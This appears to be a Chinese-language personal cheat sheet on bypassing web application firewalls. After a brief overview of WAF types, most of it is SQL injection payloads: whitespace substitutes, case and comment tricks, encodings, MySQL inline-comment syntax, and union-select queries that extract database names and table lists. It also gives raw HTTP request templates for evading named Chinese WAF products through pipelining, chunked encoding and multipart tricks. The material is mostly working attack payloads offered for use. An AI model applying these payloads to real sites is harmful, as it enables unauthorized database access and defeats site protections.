	bypass
	waf:web applicaton firewall 入侵检测系统 web防火墙（防护DDOS、SQL、XSS、XXS等）
	分类：
		代码WAF  规则写在代码里
		软件WAF  云盾、云锁、安全狗 实时监听端口
		硬件WAF  代理流量（网络镜像）、分析流量
		云WAF    流量传到检测节点，做检测
	
	WAF工作流程：
		身份验证：
			白名单（ip cookie useragent referer）
			黑名单
		数据库解析：
		匹配规则：ACL
	---------------------------------------------------------------------------------------
	基于黑名单、空格代替、转义
		空格过滤绕过  都可以代替空格
	        sqlite3      %0A  %0D  %0C %09 %20
	        mysql5       %09 %0A %0B %0C %0D %A0 %20
	        oralce11g    %00 %09 %0A %0B %0C %0D %20
	        mssql 2008   %01,%02,%03,%04,%05,%06,%07,%08,%09 %0A %0B %0C %0D %0E %0F %10 					  %11 %12 %13 %14 %15 %16 %17 %18 %19 %1A %1B %1C %1D %1E %1F %20  						 %25
	    无空格查询
	    	黑魔法：select{x user}from{x mysql.user};
			index.php?id=1e0and{``select(left(database(),1)='a'}
			index.php?id=1e0and{``(select(version())>4)}
		
		特殊符号代替空格
			科学技术法1e0
			数据计算+-*/
			特殊符号\N
			注释符 /**/
		
		URL转义/二次URL转义
		错误URL转义
		Unicode转义
		Nibble转义
		各种常见的绕过
			大小写绕过   select * from users where id ='1   ' uNion SelEcT 1,2,3,4--+
			/**/       union/**/select/**/1,2,3%23
			%0b（空格）   +   ||  分割关键词
			注释符+%0a（换行）
	            select #database;
	            1
				由于注释导致database无法执行，但是换行后后面的1反而可以执行
	        %df宽字节绕过
	        溢出绕过
	        ?id=1 and (select 1)=(Select 0xA*1000) uNiOn SeLeCt 								1,2,version(),4,5,database(),version(),8,9,10,11,12,13,14,15,16,17,18
			0xA*1000  指的是0XA后面的 "A" 重复1000次，一般来说对应用软件构成缓冲区溢出都需要					比较大的测试长度，这里1000仅供参考，在一些情况下也可以更短
	
	基于HTTP协议绕过
		1、http 0.9协议由于请求方式特殊，导致被大多数WAF放过
		
		2、同时post多个请求包，WAF只检查第一个请求包	  pipeline
			关掉repeater里的update content-length
			把connection:close 改为connection:keep-alive
			把请求包放到repeater里,如3个。然后把脏数据放在第二个位置，
			如a=2 and 1=1  共11位，将第二个post包 content-length：长度修改为11
			
			POST /test.php HTTP.1.1
			Host: 192.168.80.133
			Accept-Language:
			Accept-Encoding:
			Content-Type:
			Content-Length：
			Connection:keep-alive        //去掉
			
			a=2GET /test.php?a=2%20and%202=2 HTTP/1.0 //在原有POST基础上，构造GET请求
			a=2GET /test.php?a=2%20union%20select%201  //第二种写法
			HTTP/1.0  //可加可不加 视具体情况而定
			Host:192.168.80.144                //添加host
			Connection:keep-alive              //添加connection
			两个空格                            //此处有两个空格
		
		3、基于chunker分块传输    //绕过安全狗、云盾、云锁
			POST /test.php HTTP/1.1     //chunker是基于http1.1
			Transfer-Encoding: chunked    //需要加这个
			
			1    //长度位，16进制 代表a的长度
			a
			1   //长度位，16进制 代表=的长度
			=
			3    //长度位，16进制 代表-a[空格]的长度
			-2  
			4
			unio
			4
			n se
			5
			datab
			5
			ase()
			0    //长度位，16进制 代表结束，0后要加几个回车
			a=-2 union select database()
		
		4、协议未覆盖绕过    //绕过云锁
	        常见四种content-type类型
	        Content-Type: text/html; charset=UTF-8
			Content-Type: application/json; charset=UTF-8
			Content-Type: application/x-www-form-urlencoded; charset=UTF-8
			Content-Type: multipart/form-data;boundary=something
		
			使用multipart/form-data;并把内容设为参数名内容写入注入语句
			Content-Type: multipart/form-data;boundary=8
			
			--8
			Content-Disposition: form-data: name="a" //参数写入name中
			
			-1 union select database()
			--8--       //边界结尾加两个--
			在burp suite的repeater中有change body encoding，还原后如下
			a=-1+union+select+database%28%29
			
		5、3和4方法结合
		
			Transfer-Encoding: chunked  
			Content-Type: multipart/form-data;boundary=--------957422852
			
			--------957422852
			Content-Disposition: form-data: name="a"
			
			-1 union select database()
			--------957422852-- 
			0
		
		6、chartset绕过方式
			使用imb370编码
		
		7、漏洞银行过WAF方法
		主要思路就是添加filename后，waf会认为这是个文件，并不是一个恶意语句
		name="a"包含实际的参数，用以构造一下语句
		a= -1 union select database()
		Content-Disposition: form-data; name="a"; filename ="1.jpg"	
		//此处添加空格filename ="1.jpg"，且filename后加空格
		Content-Disposition: form-data; name="a";" filename ="1.jpg"
		//在name="a"；后加引号
		-1 union select database()


​		
​		
​		
​		
​		
​		
​		
​		
​		
​		
​		
​		


​	
​	
​	
​	
​	
​	
​	
​	
​	
​	
​	
​	
​	
​	
​	
​	
​	
​	
​	
​	
​	
​	
​	
​	
​	
​	
​	
​	


​		绕过WAF
​		1、大小写     select * from users where id ='1   ' uNion SelEcT 1,2,3,4--+
​		2、替关键字（关键字重复写）  select * from users where ID=1 ununionion selselectect 1,2,3,4%23
​		3、编码  select  * from users where id=2%2bunion%2bselect%2b1,2,3,4--+
​			union ---> 0x756e696f6e20
​			select * from users where ID=1 %75nion select 1,2,3,4%23
​	

		4、内联注释 /* */      union/**/select/**/1,2,3%23
		5、等价函数替换      verion()     @@version     mid   substr   substring   @@datadir  datadir()
		6、特殊符号   + #  %23  --+   \\\\
				select`version()`  
				@符号,select @……1.from users; 7、内联注释加！  select * from users where id = 1 /*!union//**//*!select//**/1,2,3,4--+ 
		8、缓冲区溢出
				 ?id=1 and (select 1)=(Select 0xA*1000) uNiOn SeLeCt 1,2,version(),4,5,database(),version(),8,9,10,11,12,13,14,15,16,17,18
				栗子上的 0xA*1000  指的是0XA后面的 "A" 重复1000次，一般来说对应用软件构成缓冲区溢出都需要比较大的测试长度，这里1000仅供参考，在一些情况下也可以更短
		9、mysql 特性绕过
			= 等于
			：=	赋值
			@	@+变量名可直接调用 select @test:=user();
	
			注释符号 /**/  --（空格）  #  
			/!**/  /*!50000select*/
			select * from news where tid=1 union /*!50000select*/ 1,2,3;
			/*!union*/		(/*!%53ELECT*/+/*!50000GROUP_CONCAT(table_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.TABLES*//**//*!%57HERE*//**//*!TABLE_SCHEMA*//**/LIKE/**/DATABASE())
		10、无空格查询
			黑魔法：select{x user}from{x mysql.user};
			index.php?id=1e0and{``select(left(database(),1)='a'}


​	
​			换行 123%0A123
​	
​			隐私类型转换
​			select 'a'=0;
​			select '1admin'=1;
​	    综合探索
​	
		内联注释
		黑魔法：select{x user}from{x mysql.user};
		换行符绕过：%23%0a   %2d%2d%0a
	
		select * from admin where id=1[1] union [2] select [3]1,user()[4] from [5]admin
	
		第一部分：
		（1）/**/  /*!50000union*/
		（2）空白%09 %0a %0b %0c %0d %20
		id=1%0bunion select 1,user() from admin
		(3)浮点数形式  1.2   4.2
		id=1.0union select 1,user() from admin
		(4)1E0
		id=1e0nuion select 1,user() from admin 
		(5)\
		id=\Nunion select 1,user() from admin
		第二部分：
		（1）空白
		（2）注释符 /**/   /*123213*/
		（3）括号 id=1 union(select 'test','1',(select user() from admin limit 0,1))
		第三部分：
		（1）空白
		（2）注释符号
		（3）其他字符：
				！ %21
				+  %2b
				-	%2d
				@	%40
				~	%7e
		select * from admin where id=1 union select~1,user(),version()
		(4)其他方式：
			括号   select * from admin where id=1 union select(1),user(),version()
			内联   select * from admin where id=1 union /*!50000select*/1,user(),version()
			{}		select * from admin where id=1 union select{x 1} user(),version()
			" "	   select * from admin where id=1 union select"1" user(),version()
			\N     select * from admin where id=1 union select\N ,user(),version()
	
		第四部分：
			（1）空白
			（2）注释符
			（3）其他符号
					` %60   select * from admin where id=1 union select 1,2`from admin`;(注意闭合)
					“”  select * from admin where id=1 union select 1,2"from admin";
					内联注释符号
					括号
					加字母 select * from admin where id=1 union select 1,2"A"from admi;（？？？）
			（4）浮点数、1E0 、\N
	
		第五部分：
			（1）空白
			（2）注释符号
			（3）其他符号
				破则号- select * from admin where id=1 union select 1,2 from-admin;（中文的）
				内联注释符号
				{} select * from admin where id=1 union select 1,2 from{x   admin};
				() 
		某版本的安全狗测试盲注：
		and //不拦截
		and a //不拦截
		and ！//不拦截
		and 1 //拦截
		可以发现，当and连接数字时waf会进行拦截，因此只需要在数字或者and与数字中间进行干扰即可。
	
		参数污染
	
		第一步测试注入点
		and /*!1=1*/
		and--+a%0a1/*!=*/1
		and @s1ye:=1/0
	
		-1' union--+x%0aselect 1,2,3--+
	
		第二步信息收集
		测试当前数据库的长度：and @s1ye:=length(database/**/())>0--+
	
		利用MySQL的隐式类型转换进行盲注
		简单说一下：
	
		select * from test where id = '1   '-(length(database())>0)+'1';
		即 id= 1-1+1
	
		第三步读取数据库数据
		-1' union--+x%0aselect 1,2,group_concat(table_name) from information_schema.tables where table_schema = database()--+


​	    	